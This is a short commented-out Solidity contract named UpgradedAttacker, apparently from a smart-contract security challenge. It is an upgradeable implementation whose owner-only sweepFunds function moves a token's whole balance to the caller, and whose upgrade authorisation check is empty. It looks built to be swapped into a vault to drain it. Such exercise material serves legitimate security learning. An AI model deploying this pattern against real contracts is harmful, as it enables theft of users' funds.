// import "@openzeppelin/contracts-upgradeable";

// contract UpgradedAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {

//     uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
//     uint256 public constant WAITING_PERIOD = 15 days;

//     uint256 private _lastWithdrawalTimestamp;
//     address private _sweeper;

//     /// @custom:oz-upgrades-unsafe-allow constructor
//     constructor() initializer {}

//     function initialize() initializer external {
//         __Ownable_init();
//         __UUPSUpgradeable_init();
//     }

//     function sweepFunds(address tokenAddress) external onlyOwner {
//         IERC20 token = IERC20(tokenAddress);
//         require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
//     }

//     function _authorizeUpgrade(address newImplementation) internal onlyOwner override {
//     }
// }